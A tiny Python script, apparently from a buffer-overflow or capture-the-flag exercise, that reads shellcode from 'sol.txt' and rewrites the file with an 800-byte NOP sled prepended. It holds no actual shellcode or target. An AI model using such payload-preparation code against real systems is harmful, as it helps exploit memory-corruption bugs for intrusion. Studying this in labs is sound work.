shellcode = ""
with open("sol.txt", "rb") as f:
    shellcode = f.read()
    f.close()

with open("sol.txt","wb") as f:
    data = b"\x90"*800
    data += shellcode
    f.write(data)
    f.close()